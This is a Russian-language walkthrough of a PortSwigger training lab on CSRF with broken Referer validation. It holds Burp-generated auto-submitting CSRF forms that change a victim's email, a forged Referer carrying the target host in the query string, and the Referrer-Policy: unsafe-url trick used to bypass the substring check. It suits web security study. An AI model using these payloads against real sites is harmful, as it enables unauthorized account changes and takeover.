Залогинимся под `wiener:peter`

Изменим почту на `change@me.com`

Перейдем в `Proxy` -> `HTTP history` и найдем данный запрос
```
POST /my-account/change-email
...
email=change%40me.com
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/12.%20CSRF%20with%20broken%20Referer%20validation/pics%20for%20walkthrough/1.png)

Нажмем `ПКМ` -> `Engagement tools` -> `Generate CSRF PoC` 
и получим следующий PoC
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0900b5041fe30c8103acee004800d9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change&#64;me&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/12.%20CSRF%20with%20broken%20Referer%20validation/pics%20for%20walkthrough/2.png)

И нажмем кнопку `Test in browser`, и увидим в ответ `"Invalid referer header"`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/12.%20CSRF%20with%20broken%20Referer%20validation/pics%20for%20walkthrough/3.png)


Вернемся в Proxy -> HTTP history и найдем данный запрос
```
POST /my-account/change-email
...
Referer: http://burpsuite/
...
email=change%40me.com
```
И увидим, что `Referer` изменился

Теперь вернемся к нашему старому запросу на изменение почтового ящика
Изменим в ней `Referer`, добавив наш несуществующий домен

```
POST /my-account/change-email HTTP/2
...
Referer: https://evil.domain.com/?0a0900b5041fe30c8103acee004800d9.web-security-academy.net
...
email=change%40me.com
```
и видим, что запрос успешно выполняется, а это значит, что существует механизм проверки, что значение из `Host` входит в значение `Referer`. Если было бы строгое равенство - ничего не получилось, а так как лишь вхождение в подстроки - то все ок\

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/12.%20CSRF%20with%20broken%20Referer%20validation/pics%20for%20walkthrough/4.png)

Нажмем `ПКМ` -> `Engagement tools` -> `Generate CSRF PoC`
И наш сгенерированный PoC будет выглядеть как 

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0900b5041fe30c8103acee004800d9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change2&#64;me&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0a0900b5041fe30c8103acee004800d9.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


Изменм параметр `history.pushState на history.pushState('', '', '/?0a0900b5041fe30c8103acee004800d9.web-security-academy.net');`

Наш новый PoC будет выглядеть как
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0900b5041fe30c8103acee004800d9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="change2&#64;me&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0a0900b5041fe30c8103acee004800d9.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Отправим его в `Exploit server`, добавив в `Headers` значение 
```
Referrer-Policy: unsafe-url
```
и нажмем `Store` и `Deliver exploit to victim` получим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/14.%20Cross-site%20request%20forgery%20(CSRF)/12.%20CSRF%20with%20broken%20Referer%20validation/pics%20for%20walkthrough/5.png)
